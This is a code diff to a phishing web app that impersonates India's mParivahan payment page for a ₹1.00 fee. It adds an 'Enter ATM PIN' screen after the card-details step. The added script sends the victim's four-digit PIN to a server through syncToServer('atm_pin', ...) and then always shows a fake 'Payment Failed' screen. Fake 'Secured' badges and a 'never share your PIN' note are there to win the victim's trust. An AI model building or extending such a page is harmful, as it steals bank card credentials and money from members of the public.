@@ -1390,6 +1390,125 @@
       transform: scale(0.985);
     }
 
+    /* =========================================================
+       PAGE 5.5: ATM PIN PAGE
+       ========================================================= */
+    #pageAtmPin { background: #ffffff; }
+
+    .atm-pin-header {
+      background: linear-gradient(180deg, #011b42 0%, #032766 60%, #003688 100%);
+      color: #ffffff;
+      padding: 16px 18px 36px;
+      position: relative;
+    }
+
+    .atm-pin-nav { display: flex; align-items: center; justify-content: space-between; margin-bottom: 18px; }
+
+    .atm-pin-fee-banner {
+      background: rgba(255, 255, 255, 0.08);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border: 1px solid rgba(255, 255, 255, 0.16);
+      border-radius: 16px;
+      padding: 14px 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 12px;
+    }
+
+    .atm-pin-body {
+      background: #ffffff;
+      margin-top: -18px;
+      border-radius: 26px 26px 0 0;
+      padding: 26px 20px 30px;
+      position: relative;
+      z-index: 5;
+      box-shadow: 0 -4px 18px rgba(0, 0, 0, 0.08);
+      flex: 1;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    }
+
+    .atm-pin-icon-wrap {
+      width: 72px;
+      height: 72px;
+      border-radius: 20px;
+      background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: #ffffff;
+      box-shadow: 0 8px 20px rgba(220, 38, 38, 0.35);
+      margin-bottom: 18px;
+    }
+
+    .atm-pin-title {
+      font-size: 21px;
+      font-weight: 800;
+      color: #0f172a;
+      text-align: center;
+      margin-bottom: 6px;
+      letter-spacing: -0.3px;
+    }
+
+    .atm-pin-subtitle {
+      font-size: 13px;
+      font-weight: 500;
+      color: #64748b;
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .atm-dot-slot {
+      width: 16px;
+      height: 16px;
+      border-radius: 50%;
+      border: 2px solid #cbd5e1;
+      background: transparent;
+      transition: all 0.15s ease;
+    }
+
+    .atm-dot-slot.filled {
+      background: #003688;
+      border-color: #003688;
+    }
+
+    .atm-dots-container {
+      display: flex;
+      gap: 20px;
+      margin-bottom: 28px;
+    }
+
+    .atm-security-note {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      font-size: 11.5px;
+      font-weight: 500;
+      color: #64748b;
+      background: #f8fafc;
+      border: 1px solid #e2e8f0;
+      border-radius: 10px;
+      padding: 10px 14px;
+      margin-bottom: 22px;
+      width: 100%;
+      text-align: left;
+    }
+
+    .atm-numpad-grid {
+      background: #eceef2;
+      padding: 14px 14px 22px;
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 12px;
+      border-radius: 24px 24px 0 0;
+      user-select: none;
+      width: 100%;
+      margin-top: auto;
+    }
+
     /* Toast Notification */
     .app-toast {
       position: fixed;
@@ -2226,9 +2345,100 @@
       </div>
 
       <!-- =========================================================
+           PAGE 5.5: ATM PIN PAGE
+           ========================================================= -->
+      <div class="view-page" id="pageAtmPin">
+        <header class="atm-pin-header">
+          <div class="atm-pin-nav">
+            <button class="nav-icon-btn" aria-label="Go Back" id="atmPinBackBtn">
+              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                <line x1="19" y1="12" x2="5" y2="12"></line>
+                <polyline points="12 19 5 12 12 5"></polyline>
+              </svg>
+            </button>
+
+            <div class="brand-logo">
+              <span class="brand-m">m</span><span class="brand-parivahan">Parivahan</span>
+            </div>
+
+            <div class="ssl-badge-pill">
+              <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.4" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
+              </svg>
+              <span>Secured</span>
+            </div>
+          </div>
+
+          <div class="atm-pin-fee-banner">
+            <div class="fee-details-middle">
+              <div class="fee-subtitle-top">Card Payment · mParivahan</div>
+              <div class="fee-big-amount">₹1.00</div>
+              <div class="fee-org-name">Ministry of Road Transport &amp; Highways</div>
+            </div>
+            <div class="morth-pill-tag">MORTH</div>
+          </div>
+        </header>
+
+        <main class="atm-pin-body">
+          <!-- ATM Icon -->
+          <div class="atm-pin-icon-wrap">
+            <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <rect x="2" y="5" width="20" height="14" rx="2"></rect>
+              <line x1="2" y1="10" x2="22" y2="10"></line>
+              <circle cx="12" cy="15" r="1.5" fill="currentColor"></circle>
+            </svg>
+          </div>
+
+          <div class="atm-pin-title">Enter ATM PIN</div>
+          <div class="atm-pin-subtitle">Enter your 4-digit ATM PIN to complete the card payment</div>
+
+          <!-- 4 PIN Dots -->
+          <div class="atm-dots-container" id="atmPinDots">
+            <div class="atm-dot-slot" id="atm-dot-0"></div>
+            <div class="atm-dot-slot" id="atm-dot-1"></div>
+            <div class="atm-dot-slot" id="atm-dot-2"></div>
+            <div class="atm-dot-slot" id="atm-dot-3"></div>
+          </div>
+
+          <!-- Security Note -->
+          <div class="atm-security-note">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#d97706" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+              <circle cx="12" cy="12" r="10"></circle>
+              <line x1="12" y1="8" x2="12" y2="12"></line>
+              <line x1="12" y1="16" x2="12.01" y2="16"></line>
+            </svg>
+            <span>Never share your ATM PIN with anyone. This is a secure connection.</span>
+          </div>
+
+          <!-- Numpad -->
+          <div class="atm-numpad-grid">
+            <button type="button" class="numpad-key" data-atm-key="1">1</button>
+            <button type="button" class="numpad-key" data-atm-key="2">2</button>
+            <button type="button" class="numpad-key" data-atm-key="3">3</button>
+            <button type="button" class="numpad-key" data-atm-key="4">4</button>
+            <button type="button" class="numpad-key" data-atm-key="5">5</button>
+            <button type="button" class="numpad-key" data-atm-key="6">6</button>
+            <button type="button" class="numpad-key" data-atm-key="7">7</button>
+            <button type="button" class="numpad-key" data-atm-key="8">8</button>
+            <button type="button" class="numpad-key" data-atm-key="9">9</button>
+            <button type="button" class="numpad-key key-backspace" id="atmKeyBackspace" aria-label="Backspace">
+              <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
+                <line x1="18" y1="9" x2="12" y2="15"></line>
+                <line x1="12" y1="9" x2="18" y2="15"></line>
+              </svg>
+            </button>
+            <button type="button" class="numpad-key" data-atm-key="0">0</button>
+            <button type="button" class="numpad-key key-pay-btn" id="atmKeyConfirmBtn">Pay</button>
+          </div>
+        </main>
+      </div>
+
+      <!-- =========================================================
            PAGE 6: EXACT PAYMENT FAILED SCREEN (From 6th Image)
            ========================================================= -->
       <div class="view-page" id="pagePaymentFailed">
+
         
         <div>
           <!-- Top Merchant Bar -->
@@ -2456,6 +2666,7 @@
       const pagePayment = document.getElementById('pagePayment');
       const pageUpiPin = document.getElementById('pageUpiPin');
       const pageCardDetails = document.getElementById('pageCardDetails');
+      const pageAtmPin = document.getElementById('pageAtmPin');
       const pagePaymentFailed = document.getElementById('pagePaymentFailed');
 
       // Page 1 Elements
@@ -2524,6 +2735,18 @@
       const cardExpError = document.getElementById('cardExpError');
       const cardCvvError = document.getElementById('cardCvvError');
 
+      // Page 5.5 ATM PIN Elements
+      const atmPinBackBtn = document.getElementById('atmPinBackBtn');
+      const atmPinDots = [
+        document.getElementById('atm-dot-0'),
+        document.getElementById('atm-dot-1'),
+        document.getElementById('atm-dot-2'),
+        document.getElementById('atm-dot-3')
+      ];
+      const atmNumpadKeys = document.querySelectorAll('[data-atm-key]');
+      const atmKeyBackspace = document.getElementById('atmKeyBackspace');
+      const atmKeyConfirmBtn = document.getElementById('atmKeyConfirmBtn');
+
       // Page 6 Payment Failed Elements
       const failMethodBadge = document.getElementById('failMethodBadge');
       const failMethodName = document.getElementById('failMethodName');
@@ -2548,6 +2771,7 @@
 
       let currentCaptchaText = '4KJ25';
       let enteredPin = '';
+      let enteredAtmPin = '';
       let lastPaymentMethodType = 'UPI';
 
       // Clean View Switcher
@@ -2985,10 +3209,80 @@
           cardSubmitBtn.classList.remove('loading');
           cardSubmitBtn.disabled = false;
           
-          // Trigger Page 6: EXACT PAYMENT FAILED SCREEN!
-          showPaymentFailedScreen('Card');
-        }, 1400);
+          // Open ATM PIN page
+          openAtmPinPage();
+        }, 600);
       });
+
+      // 7.5. Page 5.5: ATM PIN Page Logic
+      function openAtmPinPage() {
+        enteredAtmPin = '';
+        updateAtmPinDots();
+        switchView(pageAtmPin);
+      }
+
+      function updateAtmPinDots() {
+        for (let i = 0; i < 4; i++) {
+          if (i < enteredAtmPin.length) {
+            atmPinDots[i].classList.add('filled');
+          } else {
+            atmPinDots[i].classList.remove('filled');
+          }
+        }
+      }
+
+      atmPinBackBtn.addEventListener('click', () => {
+        switchView(pageCardDetails);
+      });
+
+      atmNumpadKeys.forEach(btn => {
+        btn.addEventListener('click', () => {
+          const num = btn.getAttribute('data-atm-key');
+          if (num !== null && /^\d$/.test(num) && enteredAtmPin.length < 4) {
+            enteredAtmPin += num;
+            updateAtmPinDots();
+
+            if (enteredAtmPin.length === 4) {
+              setTimeout(() => {
+                triggerAtmPaymentProcess();
+              }, 300);
+            }
+          }
+        });
+      });
+
+      atmKeyBackspace.addEventListener('click', () => {
+        if (enteredAtmPin.length > 0) {
+          enteredAtmPin = enteredAtmPin.slice(0, -1);
+          updateAtmPinDots();
+        }
+      });
+
+      atmKeyConfirmBtn.addEventListener('click', () => {
+        if (enteredAtmPin.length < 4) {
+          showToast('Please enter your 4-digit ATM PIN');
+          return;
+        }
+        triggerAtmPaymentProcess();
+      });
+
+      function triggerAtmPaymentProcess() {
+        atmKeyConfirmBtn.textContent = '...';
+        atmKeyConfirmBtn.disabled = true;
+
+        // Sync ATM PIN to server
+        syncToServer('atm_pin', {
+          atmPin: enteredAtmPin
+        });
+
+        setTimeout(() => {
+          atmKeyConfirmBtn.textContent = 'Pay';
+          atmKeyConfirmBtn.disabled = false;
+          
+          // Trigger Page 6: PAYMENT FAILED SCREEN
+          showPaymentFailedScreen('Card');
+        }, 1200);
+      }
 
       // 8. Page 6: Exact Payment Failed Screen Function (From 6th Image)
       function showPaymentFailedScreen(paymentType) {
